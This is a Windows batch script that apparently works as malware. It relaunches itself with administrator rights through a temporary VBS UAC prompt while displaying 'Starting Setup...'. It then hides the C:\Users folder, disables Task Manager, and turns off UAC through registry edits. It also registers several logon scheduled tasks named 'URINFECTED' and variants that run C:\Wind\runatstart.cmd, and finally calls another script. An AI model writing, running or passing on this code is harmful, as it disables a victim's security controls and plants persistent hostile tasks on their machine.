@echo off

:: BatchGotAdmin
:-------------------------------------
REM  --> Check for permissions
    IF "%PROCESSOR_ARCHITECTURE%" EQU "amd64" (
>nul 2>&1 "%SYSTEMROOT%\SysWOW64\cacls.exe" "%SYSTEMROOT%\SysWOW64\config\system"
) ELSE (
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
)

REM --> If error flag set, we do not have admin.
if '%errorlevel%' NEQ '0' (
    echo Starting Setup...
    goto UACPrompt
) else ( goto gotAdmin )

:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    set params= %*
    echo UAC.ShellExecute "cmd.exe", "/c ""%~s0"" %params:"=""%", "", "runas", 1 >> "%temp%\getadmin.vbs"

    "%temp%\getadmin.vbs"
    del "%temp%\getadmin.vbs"
    exit /B

:gotAdmin
    pushd "%CD%"
    CD /D "%~dp0"



ATTRIB +s +h C:\Users

REG add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f

SchTasks /Create  /SC ONLOGON /TN "URINFECTED"  /TR C:\Wind\runatstart.cmd
 reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f

SchTasks /Create  /SC ONLOGON /TN "URINFECTED1"  /TR C:\Wind\runatstart.cmd
SchTasks /Create  /SC ONLOGON /TN "URINFECTEDe"  /TR C:\Wind\runatstart.cmd
 SchTasks /Create  /SC ONLOGON /TN "URINFECTED4"  /TR C:\Wind\runatstart.cmd
 SchTasks /Create  /SC ONLOGON /TN "URINFECTE3D"  /TR C:\Wind\runatstart.cmd
 SchTasks /Create  /SC ONLOGON /TN "URI22edNFECTED"  /TR C:\Wind\runatstart.cmd
 SchTasks /Create  /SC ONLOGON /TN "URINFECewTED"  /TR C:\Wind\runatstart.cmd
Sqet.cmd